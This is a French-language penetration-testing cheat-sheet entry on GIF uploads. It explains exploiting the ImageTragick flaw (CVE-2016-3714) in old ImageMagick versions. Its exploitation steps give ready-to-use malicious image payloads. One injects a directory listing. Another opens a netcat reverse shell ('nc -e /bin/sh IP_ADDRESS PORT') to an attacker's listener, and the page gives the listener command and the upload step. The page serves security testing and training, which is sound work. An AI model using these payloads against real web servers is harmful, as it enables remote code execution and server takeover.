# GIF

**Facteur de risque** : RCE

**Extensions** : `.gif`

**Type MIME** : `image/gif`

**Description** : 

Le **Graphics Interchange Format** ou **GIF**, est un format d'image.

## Sommaire

- ImageTragick

## RCE : ImageTragick CVE-2016–3714

<img src="logo_imagetragick.png" title="" alt="" height="150">

**ImageMagick** est un logiciel utilisé pour créer, modifier (redimensionner), convertir ou afficher des fichiers d'images dans un très grand nombre de formats.

ImageMagick possède plusieurs failles, donc une qui permet d'exécuter du code arbitraire à distance : https://imagetragick.com

### Pré-requis

- ImageMagick <= 6.9.3-9 est utilisé par le serveur web

### Exploitation

1. Copier le code suivant, qui permet de lister le répertoire (**ls.gif**):
   
   ```shell
   push graphic-context
   viewbox 0 0 640 480
   fill 'url(https://example.com/image.jpg";|ls "-la)'
   pop graphic-context
   ```
   
    La fonction `url()` est censé contenir l'URL d'une image (`https://example.com/image.jpg`). Ici on injecte le code `";|ls "-la` pour lister le répertoire.

2. Téléverser ce fichier sur l'application.

Comme l'exploitation se passe au moment du téléversement, l'utilisateur peut ne pas voir pas le résultat des commandes. Mais un **reverse shell** est possible !

1. Copier le code suivant :
   
   ```shell
   push graphic-context
   viewbox 0 0 640 480
   fill 'url(https://example.com/image.jpg";|nc -e /bin/sh IP_ADDRESS "PORT)'
   pop graphic-context
   ```
   
   La fonction `url()` est censé contenir l'URL d'une image (`https://example.com/image.jpg`). Ici, on injecte le code `";|nc -e /bin/sh IP_ADDRESS_HERE "PORT_HERE` pour avoir un reverse shell.

2. Remplacer `IP_ADRESS` et `PORT` dans le code (faire attention aux guillemets présents), puis enregistrer sous forme d'image (**nc.gif**). Par exemple :
   
   ```shell
   fill 'url(https://example.com/image.jpg";|nc -e /bin/sh 127.0.0.1 "1234)'
   ```

3. Écouter votre port :
   
   ```shell
   nc -lnvp 1234
   ```

4. Téléverser ce fichier sur l'application. 
   Au moment du téléversement, ImageMagick va traiter l'image, et exécuter en le code.

## References

- ImageTragick : 
  - https://imagetragick.com

## Todo

- [Remote Code Execution in the Avatars - Dodd Security](https://doddsecurity.com/94/remote-code-execution-in-the-avatars/)

- Beating getimagesize() : [Unrestricted File Upload | OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

- Upload .gif file to be resized - image library flaw exploited

- [GIF/Javascript Polyglots: Abusing GIFs, tags, and MIME types for evil - Web Hacking - 0x00sec - The Home of the Hacker](https://0x00sec.org/t/gif-javascript-polyglots-abusing-gifs-tags-and-mime-types-for-evil/5088)

- [ThinkFu &rsaquo; GIF/Javascript Polyglots](http://web.archive.org/web/20191216134147/http://www.thinkfu.com/blog/gifjavascript-polyglots)
